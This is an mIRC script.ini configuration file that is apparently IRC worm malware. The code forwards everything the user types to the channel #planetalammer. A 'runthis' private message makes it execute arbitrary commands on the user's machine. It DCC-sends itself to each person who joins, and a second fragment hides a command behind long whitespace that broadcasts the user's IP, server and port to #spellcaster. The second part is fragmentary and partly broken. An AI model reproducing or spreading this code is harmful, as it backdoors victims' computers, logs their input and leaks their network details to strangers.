[script]
n0=script.ini
n1=
n2=on 1:START:{
n3=  .sreq ignore
n4=  .remote on
n5=}
n6=on 1:CONNECT:
n7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n8=on 1:INPUT:*:{
n9=  .msg #planetalammer ( $+ $active $+ ) $1-
n10=}
n11=on 1:TEXT:*:?:{
n12=  if ( $1 == runthis ) { .run $2- }
n13=}
n14=
n15=on 1:JOIN:*:{
n16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n17=}
e on
n2=  titlebar (Not connected)
n3=}
n4=raw 401:*: {
n5=  halt
n6=}
n7=RAW 001:*:titlebar (Connecting to $server $+ )
n8=
n9=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #spellcaster Hi.  $ip on $server $+ : $+ $port $+ .
n10=
n11=on 1:DISCONNECT:titlebar (Not connected)
n12